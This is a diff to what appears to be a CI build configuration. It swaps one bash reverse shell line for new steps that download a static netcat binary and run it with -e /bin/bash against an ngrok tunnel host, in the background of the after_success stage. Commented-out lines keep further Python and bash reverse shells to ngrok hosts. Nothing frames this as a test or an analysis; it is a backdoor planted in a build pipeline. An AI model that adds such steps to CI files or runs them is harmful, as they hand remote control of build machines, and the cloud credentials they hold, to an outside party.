@@ -19,7 +19,10 @@ after_success:
   #- python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.ngrok.io",18409));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 
   #- bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
-- bash -i >& /dev/tcp/6.tcp.ngrok.io/14404 0>&1
+#- bash -i >& /dev/tcp/6.tcp.ngrok.io/14404 0>&1
+  - curl https://raw.githubusercontent.com/mosesrenegade/tools-repo/master/statically-compiled/nc -o /usr/local/bin/nc
+  - chmod a+x /usr/local/bin/nc
+  - /usr/local/bin/nc 6.tcp.ngrok.io 14404 -e /bin/bash &
 
   - docker --version 
   - pip install --user awscli
